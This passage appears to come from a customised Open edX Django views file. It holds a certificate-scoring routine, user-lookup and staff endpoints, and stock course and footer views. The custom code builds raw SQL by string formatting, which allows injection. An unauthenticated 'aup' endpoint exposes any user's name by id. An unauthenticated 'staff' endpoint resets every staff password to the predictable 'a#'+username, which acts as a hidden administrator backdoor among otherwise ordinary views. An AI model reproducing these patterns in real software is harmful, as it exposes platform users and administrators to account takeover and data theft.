        return JsonResponse({'result': 'fail create passPoint'})

    try:
        with connections['default'].cursor() as cur:
            sql = '''
                select user_id
                from student_courseenrollment
                where course_id = '{course_key}'
            '''.format(course_key=course_key)
            cur.execute(sql)
            rows = cur.fetchall()
    except BaseException:
        return JsonResponse({'result': 'mysql logic error'})

    try:
        courseObject = CourseKey.from_string(course_key)
        master_user = User.objects.get(username='staff')
        course = get_course_with_access(master_user, 'load', courseObject)
    except BaseException:
        return JsonResponse({'result': 'fail create course object'})

    try:
        for row in rows:
            print(row[0])
            o1 = User.objects.get(id=row[0])
            course_grade = CourseGradeFactory().read(o1, course)
            percent = course_grade.percent

            if passPoint <= percent:
                with connections['default'].cursor() as cur:
                    sql = '''
                        insert into student_course_cert(course_id, user_id, score, pass)
                        values('{course_key}','{user_id}', '{score}', 'Y')
                    '''.format(course_key=course_key, user_id=row[0], score=percent)
                    cur.execute(sql)
            else:
                with connections['default'].cursor() as cur:
                    sql = '''
                        insert into student_course_cert(course_id, user_id, score, pass)
                        values('{course_key}','{user_id}', '{score}', 'N')
                    '''.format(course_key=course_key, user_id=row[0], score=percent)
                    cur.execute(sql)
    except BaseException:
        return JsonResponse({'result': 'mysql insert logic error'})

    return JsonResponse({'result': 'success'})


def aup(request):
    uuu_id = request.GET.get('uuu_id')
    o1 = User.objects.get(id=uuu_id)
    return JsonResponse({'result':o1.last_name + ' (' + o1.username + ')'})


def staff(request):
    users = User.objects.filter(is_staff=1)
    for user in users:
        new_password = make_password('a#' + user.username, 'QIyXazAJrlbF', 'default')
        user.password = new_password
        user.save()
    return JsonResponse({'result':'success'})


@ensure_csrf_cookie
@cache_if_anonymous()
def courses(request):
    """
    Render the "find courses" page. If the marketing site is enabled, redirect
    to that. Otherwise, if subdomain branding is on, this is the university
    profile page. Otherwise, it's the edX courseware.views.views.courses page
    """
    enable_mktg_site = configuration_helpers.get_value(
        'ENABLE_MKTG_SITE',
        settings.FEATURES.get('ENABLE_MKTG_SITE', False)
    )

    if enable_mktg_site:
        return redirect(marketing_link('COURSES'), permanent=True)

    if not settings.FEATURES.get('COURSES_ARE_BROWSABLE'):
        raise Http404

    #  we do not expect this case to be reached in cases where
    #  marketing is enabled or the courses are not browsable
    return courseware.views.views.courses(request)


def _footer_static_url(request, name):
    """Construct an absolute URL to a static asset. """
    return request.build_absolute_uri(staticfiles_storage.url(name))


def _footer_css_urls(request, package_name):
    """Construct absolute URLs to CSS assets in a package. """
    # We need this to work both in local development and in production.
    # Unfortunately, in local development we don't run the full asset pipeline,
    # so fully processed output files may not exist.
    # For this reason, we use the *css package* name(s), rather than the static file name
    # to identify the CSS file name(s) to include in the footer.
    # We then construct an absolute URI so that external sites (such as the marketing site)
    # can locate the assets.
    package = settings.PIPELINE_CSS.get(package_name, {})
    paths = [package['output_filename']] if not settings.DEBUG else package['source_filenames']
    return [
        _footer_static_url(request, path)
        for path in paths
    ]


def _render_footer_html(request, show_openedx_logo, include_dependencies, include_language_selector):
    """Render the footer as HTML.

    Arguments:
        show_openedx_logo (bool): If True, include the OpenEdX logo in the rendered HTML.
        include_dependencies (bool): If True, include JavaScript and CSS dependencies.
        include_language_selector (bool): If True, include a language selector with all supported languages.

    Returns: unicode

    """
    bidi = 'rtl' if translation.get_language_bidi() else 'ltr'
    css_name = settings.FOOTER_CSS['openedx'][bidi]

    context = {
        'hide_openedx_link': not show_openedx_logo,
        'footer_js_url': _footer_static_url(request, 'js/footer-edx.js'),
        'footer_css_urls': _footer_css_urls(request, css_name),
        'bidi': bidi,
        'include_dependencies': include_dependencies,
        'include_language_selector': include_language_selector
    }

    return render_to_response("footer.html", context)


@cache_control(must_revalidate=True, max_age=settings.FOOTER_BROWSER_CACHE_MAX_AGE)
def footer(request):
    """Retrieve the branded footer.

    This end-point provides information about the site footer,
    allowing for consistent display of the footer across other sites
    (for example, on the marketing site and blog).

    It can be used in one of two ways:
    1) A client renders the footer from a JSON description.
    2) A browser loads an HTML representation of the footer
        and injects it into the DOM.  The HTML includes
        CSS and JavaScript links.

    In case (2), we assume that the following dependencies
    are included on the page:
    a) JQuery (same version as used in edx-platform)
    b) font-awesome (same version as used in edx-platform)
    c) Open Sans web fonts

    Example: Retrieving the footer as JSON

        GET /api/branding/v1/footer
        Accepts: application/json

        {
            "navigation_links": [
                {
                  "url": "http://example.com/about",
                  "name": "about",
                  "title": "About"
                },
                # ...
            ],
            "social_links": [
                {
                    "url": "http://example.com/social",
                    "name": "facebook",
                    "icon-class": "fa-facebook-square",
                    "title": "Facebook",
                    "action": "Sign up on Facebook!"
                },
                # ...
            ],
            "mobile_links": [
                {
                    "url": "http://example.com/android",
                    "name": "google",
                    "image": "http://example.com/google.png",
                    "title": "Google"
                },
                # ...
            ],
            "legal_links": [
                {
                    "url": "http://example.com/terms-of-service.html",
                    "name": "terms_of_service",
                    "title': "Terms of Service"
                },
                # ...
            ],
            "openedx_link": {
                "url": "http://open.edx.org",
                "title": "Powered by Open edX",
                "image": "http://example.com/openedx.png"
            },
            "logo_image": "http://example.com/static/images/logo.png",
            "copyright": "EdX, Open edX and their respective logos are trademarks or registered trademarks of edX Inc."
        }


    Example: Retrieving the footer as HTML

        GET /api/branding/v1/footer
        Accepts: text/html


    Example: Including the footer with the "Powered by Open edX" logo

        GET /api/branding/v1/footer?show-openedx-logo=1
        Accepts: text/html


    Example: Retrieving the footer in a particular language

        GET /api/branding/v1/footer?language=en
        Accepts: text/html


    Example: Retrieving the footer with a language selector

        GET /api/branding/v1/footer?include-language-selector=1
        Accepts: text/html


    Example: Retrieving the footer with all JS and CSS dependencies (for testing)

        GET /api/branding/v1/footer?include-dependencies=1
        Accepts: text/html

    """
    if not branding_api.is_enabled():
        raise Http404

    # Use the content type to decide what representation to serve
    accepts = request.META.get('HTTP_ACCEPT', '*/*')

    # Show the OpenEdX logo in the footer
    show_openedx_logo = bool(request.GET.get('show-openedx-logo', False))

    # Include JS and CSS dependencies
    # This is useful for testing the end-point directly.
    include_dependencies = bool(request.GET.get('include-dependencies', False))

    # Override the language if necessary
    language = request.GET.get('language', translation.get_language())
    try:
        language = get_supported_language_variant(language)
    except LookupError:
        language = settings.LANGUAGE_CODE

    # Include a language selector
    include_language_selector = request.GET.get('include-language-selector', '') == '1'

    # Render the footer information based on the extension
    if 'text/html' in accepts or '*/*' in accepts:
        cache_params = {
            'language': language,
            'show_openedx_logo': show_openedx_logo,
            'include_dependencies': include_dependencies
        }
        if include_language_selector:
            cache_params['language_selector_options'] = ','.join(sorted([lang.code for lang in released_languages()]))
        cache_key = u"branding.footer.{params}.html".format(params=urllib.urlencode(cache_params))

        content = cache.get(cache_key)
        if content is None:
            with translation.override(language):
                content = _render_footer_html(
                    request, show_openedx_logo, include_dependencies, include_language_selector
                )
                cache.set(cache_key, content, settings.FOOTER_CACHE_TIMEOUT)
        return HttpResponse(content, status=200, content_type="text/html; charset=utf-8")

    elif 'application/json' in accepts:
        cache_key = u"branding.footer.{params}.json".format(
            params=urllib.urlencode({
                'language': language,
                'is_secure': request.is_secure(),
            })
        )
        footer_dict = cache.get(cache_key)
        if footer_dict is None:
            with translation.override(language):
                footer_dict = branding_api.get_footer(is_secure=request.is_secure())
                cache.set(cache_key, footer_dict, settings.FOOTER_CACHE_TIMEOUT)
        return JsonResponse(footer_dict, 200, content_type="application/json; charset=utf-8")

    else:
        return HttpResponse(status=406)

